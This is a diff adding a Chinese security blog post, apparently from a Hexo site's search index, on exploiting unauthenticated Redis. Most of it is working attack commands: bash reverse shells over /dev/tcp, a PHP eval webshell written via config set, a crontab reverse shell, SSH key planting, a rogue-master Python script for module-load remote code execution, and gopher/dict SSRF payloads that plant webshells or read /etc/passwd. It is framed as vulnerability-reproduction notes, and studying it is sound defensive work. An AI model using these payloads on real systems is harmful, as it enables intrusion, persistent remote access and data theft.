+<li><h4 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h4></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h3><p>利用crontab反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set x &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.119.1/7777 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set x &quot;AAAAB3NzaC1yc2EAAAADAQABAAABgQCzmbxEDVJkRj8CfUb94H//exUqIxTe67ssJBHYJVok9ZVB3g8SYdHrkzrXZpfx5VqgoCEJjNNwuVGP/2R3AK/XgtqYcCAfzWnBRdA8vW5LVzB61wqyYIugQaC9y56x+QTTXuKTltgjpjuBXsAlQ6+5TlPB79qonV/xEsAr7PzxghhtxIZF2A+XTxrTJ4ByfUCvfpZ1ORxNdbnVEWMfSR6RYko9eVkC5AuRiscdYKumrP5Waoj4ET5D+/rRPxE9SPSAIRYs68DZ9mbkKhHgZLVCqNfFp1yZ/t97DfKihn9nRWwQjetSsrqLDbBfhLA0Frq0o+usaevuSL5dgToSwLg5IuWMVvdkcpbK92M9eb7Y0aWgSfGXbkaVegCtriDRYLNK/8rifro1vKwIG1aBcR7NyEe0KGQV9pYO8HPY0TpDq4eDNq1lAGTgND/DAVqXnVce9yPID+XgPhpTt1gxzGdjaNDNSZTotsHppK3EsYsV54QlMseIubHP0DXpgSkLWws=&quot; (PS: 这里内容为公钥 中间的密钥文件)</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -p 10022 -i id_rsa root@127.0.0.1</span><br><span class="line">-p 指定端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107903.png" alt="image-20201124124820325"></p>
+<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p><strong>Redis主从复制详解:</strong> </p>
+<p><a href="https://www.bbsmax.com/A/l1dyv3Agze/">https://www.bbsmax.com/A/l1dyv3Agze/</a></p>
+<p><strong>主从复制流量分析:</strong></p>
+<p><a href="https://inhann.top/2021/09/14/redis_master_slave_rce/">https://inhann.top/2021/09/14/redis_master_slave_rce/</a></p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="使用-Docker-搭建"><a href="#使用-Docker-搭建" class="headerlink" title="使用 Docker 搭建"></a>使用 Docker 搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Redis_1</span><br><span class="line">docker run -it -d -p 6380:6379 --name Redis_1 redis:5.0</span><br></pre></td></tr></table></figure>
+
+<h4 id="编译源码搭建"><a href="#编译源码搭建" class="headerlink" title="编译源码搭建"></a>编译源码搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://download.redis.io/releases/redis-5.0.14.tar.gz</span><br><span class="line">tar xvf redis-5.0.14.tar.gz</span><br><span class="line">cd redis-5.0.14</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p><strong>保护模式报错</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107733.png" alt="image-20211203143019591"></p>
+<p><strong>解决方式</strong></p>
+<p>配置文件中可以关闭保护模式</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107688.png" alt="image-20211203143103050"></p>
+<p><strong>配置绑定ip</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 192.168.56.106 // 或者 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107992.png" alt="image-20211203143328195"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108446.png" alt="image-20211203143350114"></p>
+<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108939.png" alt="image-20211203143411876"></p>
+<h3 id="构建恶意-so-文件"><a href="#构建恶意-so-文件" class="headerlink" title="构建恶意 .so 文件"></a>构建恶意 .so 文件</h3><p>github项目地址: <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd RedisModules-ExecuteCommand</span><br><span class="line">make</span><br><span class="line"># module.so 在src目录下</span><br></pre></td></tr></table></figure>
+
+<p>导入模块方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server ./redis.conf --loadmodule ./module.so</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h xxxxx</span><br><span class="line">&gt; module load ./module.so</span><br></pre></td></tr></table></figure>
+
+<p><strong>命令执行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="脚本探测"><a href="#脚本探测" class="headerlink" title="脚本探测:"></a>脚本探测:</h3><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.56.106 -p 6380 -L 192.168.56.106  -f module.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108335.png" alt="image-20211203151828074"></p>
+<h3 id="手工探测"><a href="#手工探测" class="headerlink" title="手工探测"></a>手工探测</h3><hr>
+<p><strong>恶意Redis服务端模拟脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span>(<span class="params">lport</span>):</span></span><br><span class="line">    resp = <span class="string">&quot;&quot;</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>,lport))</span><br><span class="line">    sock.listen(<span class="number">10</span>)</span><br><span class="line">    conn,address = sock.accept()  </span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PING&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+PONG&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;REPLCONF&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+OK&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;PSYNC&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;SYNC&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp =  <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(resp) != <span class="built_in">bytes</span>:</span><br><span class="line">                resp =resp.encode()            </span><br><span class="line">            conn.send(resp)    </span><br><span class="line">        <span class="comment">#elif &quot;exit&quot; in data:</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    parser = OptionParser()                     </span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;rogue server listen port, default 21000&quot;</span>, default=<span class="number">21000</span>,metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)        </span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>,<span class="string">&quot;--exp&quot;</span>, dest=<span class="string">&quot;exp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;Redis Module to load, default exp.so&quot;</span>, default=<span class="string">&quot;exp.so&quot;</span>,metavar=<span class="string">&quot;EXP_FILE&quot;</span>)            </span><br><span class="line"></span><br><span class="line">    (options , args )= parser.parse_args()</span><br><span class="line">    lport = options.lp</span><br><span class="line">    exp_filename = options.exp</span><br><span class="line"></span><br><span class="line">    CLRF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    payload=<span class="built_in">open</span>(exp_filename,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Start listing on port: %s&quot;</span> %lport</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Load the payload:   %s&quot;</span> %exp_filename     </span><br><span class="line">    RogueServer(lport)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python RogueServer.py --lport 8088 --exp exp.so</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032109720.png" alt="image-20211203201601816"></p>
+<p>执行相关命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置redis的备份路径为当前目录</span><br><span class="line">&gt; config set dir ./</span><br><span class="line">#设置备份文件名为exp.so，默认为dump.rdb</span><br><span class="line">&gt; config set dbfilename exp.so</span><br><span class="line">#设置主服务器IP和端口</span><br><span class="line">&gt; slaveof 192.168.56.106 8088</span><br><span class="line">#加载恶意模块</span><br><span class="line">&gt; module load ./exp.so</span><br><span class="line">#切断主从，关闭复制功能</span><br><span class="line">&gt; slaveof no one</span><br><span class="line">#执行系统命令</span><br><span class="line">&gt; system.exec &#x27;whoami&#x27;</span><br><span class="line">&gt; system.rev 127.0.0.1 9999    </span><br><span class="line">#通过dump.rdb文件恢复数据</span><br><span class="line">&gt; config set dbfilename dump.rdb</span><br><span class="line">#删除exp.so</span><br><span class="line">&gt; system.exec &#x27;rm ./exp.so&#x27;</span><br><span class="line">#卸载system模块的加载</span><br><span class="line">&gt; module unload system</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108634.png" alt="image-20211203201544438"></p>
+<h3 id="exp汇总"><a href="#exp汇总" class="headerlink" title="exp汇总"></a>exp汇总</h3><p>[+] 构造恶意so文件:  <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+<p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
+<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<p><a href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p>
+<p><strong>参考链接:</strong></p>
+<p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
+<h2 id="SSRF利用方式"><a href="#SSRF利用方式" class="headerlink" title="SSRF利用方式"></a>SSRF利用方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">代替方式: 127.1</span><br><span class="line">[::1]</span><br><span class="line">localhost</span><br><span class="line">转成10进制, 2130706433</span><br></pre></td></tr></table></figure>
+
+<p>通过dict协议利用redis的未授权访问反弹shell的步骤如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1、开启反弹shell的监听</span><br><span class="line">nc -l 9999</span><br><span class="line"># 2、依次执行下面的命令</span><br><span class="line">curl dict://192.168.0.119:6379/set:x:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dir:/etc/</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dbfilename:crontab</span><br><span class="line">curl dict://192.168.0.119:6379/bgsave</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-file协议读取文件"><a href="#1-file协议读取文件" class="headerlink" title="1.file协议读取文件"></a>1.file协议读取文件</h3><p>这个协议可以读取系统的一些存放密码的文件，比如说linux的/etc/passwd或者windows的C:/windows/win.ini 等，或者说ctf中的flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx/xx/xx.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-利用gphper协议"><a href="#2-利用gphper协议" class="headerlink" title="2.利用gphper协议"></a>2.利用gphper协议</h3><p>利用工具gphperus, 生成payload</p>
+<p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html): </span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url=gopher://127.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B1%255D%2529%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始内容: 需要两次url编码</span><br><span class="line">gopher://2130706433:6379/_set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n\n&quot;  </span><br><span class="line">config set dir /var/www/html  </span><br><span class="line">config set dbfilename shell.php  </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-利用dict协议"><a href="#3-利用dict协议" class="headerlink" title="3.利用dict协议"></a>3.利用dict协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/info</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">shell需要进行utf-8编码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=dict://2130706433:6379/set:x:&quot;\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x50\x4F\x53\x54\x5B\x31\x5D\x29\x3F\x3E&quot;</span><br><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl http://172.16.20.51:28151/?url=dict://2130706433:6379/config:get:dir</span><br><span class="line">-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY)</span><br><span class="line">*2</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">将内容转成utf-<span class="number">8</span></span><br><span class="line">s = <span class="string">&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&quot;0xa&quot;</span>,<span class="string">&quot;0x0a&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">r&quot;\\x&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1])?&gt;</span><br><span class="line">转成utf-8, \\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e 对\进行转义</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://172.16.20.51:28151/?url=dict://2130706433:6379/set:x:\&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e\&quot;</span><br><span class="line">使用 curl 需要对x的键值进行转义</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://zhuanlan.zhihu.com/p/36529010">https://zhuanlan.zhihu.com/p/36529010</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483814&amp;idx=1&amp;sn=572eff495ac4e2f80583c27ddf8fe96b&amp;chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b">https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483814&amp;idx=1&amp;sn=572eff495ac4e2f80583c27ddf8fe96b&amp;chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b</a></p>
+<p><a href="http://blog.leanote.com/post/snowming/2d9a2082c02b">http://blog.leanote.com/post/snowming/2d9a2082c02b</a></p>
+<p>[+] 利用主从复制getshell: <a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+        <tag>网络安全</tag>
+        <tag>总结</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MySQL提权方式总结</title>
     <url>/articles/82bffd74/</url>
     <content><![CDATA[<h1 id="MySQL提权方式总结"><a href="#MySQL提权方式总结" class="headerlink" title="MySQL提权方式总结"></a>MySQL提权方式总结</h1><h2 id="os-shell-into-outfile"><a href="#os-shell-into-outfile" class="headerlink" title="os-shell / into outfile"></a>os-shell / into outfile</h2><ul>
@@ -865,7 +1069,7 @@
 <li>  load_file() 开启 即 secure_file_priv 无限制</li>
 <li>  网站路径有写入权限</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure>
 
 
 
